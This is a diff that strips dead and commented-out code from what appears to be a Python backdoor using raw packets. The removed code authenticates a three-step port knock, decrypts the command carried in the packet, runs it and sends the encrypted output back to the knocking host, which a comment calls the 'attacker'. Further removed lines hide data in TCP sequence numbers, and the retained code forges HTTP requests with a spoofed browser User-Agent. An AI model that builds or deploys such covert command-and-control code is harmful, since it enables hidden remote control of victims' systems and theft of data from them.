@@ -95,46 +95,6 @@ config = Configuration()
 # Initialize packet_list for reassembling packets in correct order.
 packet_list = {}
 
-#
-# def read_configuration():
-#     """
-#     Reads configuration file.
-#     :return: list (config vars)
-#     """
-#
-#     configuration = {
-#         'receiver_address': '',
-#         'sender_address': '',
-#         'receiver_port1': 0,
-#         'receiver_port2': 0,
-#         'receiver_port3': 0,
-#         'sender_port': 0,
-#         'port_knock_auth': '',
-#     }
-#
-#     with open(file=CONFIGURATION_PATH, mode='r', encoding='utf-8') as file:
-#         fp = [line.rstrip('\n') for line in file]
-#         for line in fp:
-#             if line.isspace() or line.startswith('#'):
-#                 continue
-#
-#             config_data = line.split('=')
-#             if config_data[0] in configuration:
-#                 if config_data[0] in ('receiver_address', 'sender_address', 'port_knock_auth'):
-#                     configuration[config_data[0]] = config_data[1]
-#                 elif config_data[0] in ('receiver_port1', 'receiver_port2', 'receiver_port3', 'sender_port'):
-#                     data = config_data[1]
-#                     if data.isdigit():
-#                         configuration[config_data[0]] = int(config_data[1])
-#                     else:
-#                         print("Invalid configuration, ports must be integers.")
-#                         exit()
-#                 else:
-#                     print("Invalid configuration, unsupported variable detected.")
-#                     exit()
-#
-#     return configuration
-
 
 def run_commands(command):
     """
@@ -310,71 +270,6 @@ def process_sniff_pkt(pkt):
         else:
             print(f"WARNING, invalid instruction: {instruction}.")
 
-    return
-
-    # Instruction only stored in first packet
-    # If multi-packet, save to packet_list dictionary style 1:data, 2:data
-
-    if knock_order == 0:
-        if dst_port == port1 and data == port_knock_auth:
-            print(f"First knock valid")
-            knock_order = 1
-        else:
-            print(f"First knock Failed")
-            knock_order = 0
-    elif knock_order == 1:
-        if dst_port == port2 and data == port_knock_auth:
-            print(f"Second knock valid")
-            knock_order = 2
-        else:
-            print(f"Second Knock Failed.")
-            knock_order = 0
-    elif knock_order == 2:
-        final_payload = data.split('|')
-        auth_string = final_payload[0]
-        command = final_payload[1]
-        address = pkt.payload.src
-        if dst_port == port3 and auth_string == port_knock_auth:
-            print(f"Third knock valid")
-            print(f"Encrypted Cmd: {command}")
-            decrypt_cmd = encryption.decrypt(command.encode('utf-8')).decode('utf-8')
-            print(f"Cmd: {decrypt_cmd}")
-            result = run_commands(decrypt_cmd)
-            encrypted_data = encryption.encrypt(result.encode('utf-8')).decode('utf-8')
-            send_command_output(encrypted_data, address, sender_port)
-            knock_order = 0
-        else:
-            print(f"Third Knock Failed.")
-            knock_order = 0
-
-    # print(f"IP Dest: {ip_dst}")
-    # print(f"Dst Port: {dst_port}")
-    # print(data)
-
-
-# def send_command_output(data, address, port):
-#     """
-#     Create TCP socket connection to specified address/port and send the string data.
-#     :param data: str
-#     :param address: dst IP
-#     :param port: dst port
-#     :return: None
-#     """
-#
-#     dst = address
-#     sport = 7000
-#     dport = port
-#     inital_seq_num = 1000
-#
-#     # Add short delay ensuring attacker sniff is ready.
-#     time.sleep(0.5)
-#
-#     # IPv4 Socket connection to receiver.
-#     with sock.socket(sock.AF_INET, sock.SOCK_STREAM) as my_sock:
-#         my_sock.setsockopt(sock.SOL_SOCKET, sock.SO_REUSEADDR, 1)
-#         my_sock.connect((address, port))
-#         my_sock.sendall(data.encode("utf-8"))
-
 
 def get_file_binary(file_path):
     # file_name = "file_path"
@@ -419,8 +314,6 @@ def send_message(message, instruction, filename=""):
     ack = IP(dst=address) / TCP(sport=syn_ack[TCP].dport, dport=dport, flags='A', seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1)
     send(ack, verbose=0)
 
-    # message = "hello"
-    # request = f"POST / HTTP/1.1\r\n\r\n" + message
     request = f"POST / HTTP/1.1\r\n" \
               f"Host: 192.168.1.195\r\n" \
               f"User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0\r\n" \
@@ -482,83 +375,6 @@ def send_message(message, instruction, filename=""):
                 current_seq = syn_ack[TCP].ack + int(len(payload) * idx)
             else:
                 current_seq = r_ack[TCP].ack
-
-            # message = one_time_password + packet_order + delimiter + command
-            # encrypt_msg = packet_start + encryption.encrypt(message.encode('utf-8')).decode('utf-8')
-            # encrypt_len = len(encrypt_msg.encode('utf-8'))
-            # if encrypt_len > 508:
-            #     print("Warning, payload in port knock packet exceeding 508 bytes, may not decrypt if payload "
-            #           "is truncated.")
-            #     port_knock2 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port) / Raw(load=encrypt_msg)
-            #     send(port_knock2, verbose=0)
-        # print("Warning, payload in port knock packet exceeding 500 bytes, may not decrypt if payload truncated.")
-
-
-
-
-    #
-    #
-    #
-    # http_request = IP(dst="192.168.1.182") / TCP(sport=6000, dport=80, flags='PA', seq=1,
-    #                                              ack=1) / request
-    # send(http_request, verbose=0)
-    #
-    # http_request = IP(dst=address) / TCP(sport=syn_ack[TCP].dport, dport=dport, flags='PA', seq=syn_ack[TCP].ack,
-    #                                      ack=syn_ack[TCP].seq + 1) / request
-    # send(http_request, verbose=0)
-    #
-    # # Starting to send data.
-    # cur_seq = syn_ack.ack
-    # cur_ack = syn_ack.seq + 1
-    #
-    # data = encryption.encrypt(message.encode("ascii")).decode("ascii")
-    # # data = message
-    # current_seq = 1000
-    # for c in data:
-    #     if current_seq > 2000000000:
-    #         current_seq = 0
-    #     current_seq += 1000
-    #     stega_seq = current_seq + ord(c)
-    #
-    #     tcp_pushack = ip / TCP(sport=sport, dport=dport, flags='PA', seq=stega_seq, ack=cur_ack)
-    #     send(tcp_pushack, verbose=0)
-    #     cur_seq = stega_seq
-    #     # cur_ack = tcp_ack.seq
-    #     # cur_seq += len(data)
-    #     # RESPONSE = sr1(ip / PUSHACK / Raw(load=data))
-    #
-    # # Closing TCP connection
-    # # start_new_thread(wait_for_fin_ack, (address, ip, sport, dport))
-    # tcp_fin = ip / TCP(sport=sport, dport=dport, flags="FA", seq=cur_seq, ack=cur_ack)
-    # # tcp_finack = sr1(tcp_fin)
-    # send(tcp_fin, verbose=0)
-    # # tcp_lastack = ip / TCP(sport=sport, dport=dport, flags="A", seq=tcp_finack.ack, ack=tcp_finack.seq + 1)
-    # tcp_lastack = ip / TCP(sport=sport, dport=dport, flags="A", seq=cur_seq, ack=cur_ack + 1)
-    # send(tcp_lastack, verbose=0)
-    # print("Send Complete.")
-
-
-# def wait_for_fin_ack(address, ip, sport, dport):
-#     print("sniffing")
-#     # tcp_finack = sniff(filter=f"host {address} and tcp-fin != 0", count=1)
-#     tcp_finack = sniff(filter=f"host {address} and tcp-fin != 0", count=1)
-#     print("sniffed!")
-#     print(tcp_finack)
-#     ack = tcp_finack[0].payload.payload.ack
-#     seq = tcp_finack[0].payload.payload.seq
-#     print(f"ack {ack}")
-#     print(f"seq {seq}")
-#     tcp_lastack = ip / TCP(sport=sport, dport=dport, flags="A", seq=ack, ack=seq + 1)
-#     send(tcp_lastack)
-
-    # IPv4 Socket connection to receiver.
-    # with socket(AF_INET, SOCK_STREAM) as sock:
-    #     sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
-    #     sock.connect((address, port))
-    #     sock.sendall(message.encode("utf-8"))
-    #     print(f"Receiver: \tIP = {address}, Port = {port}")
-    #     print(f"Message Sent: \t{message}")
-
 
 
 if __name__ == "__main__":
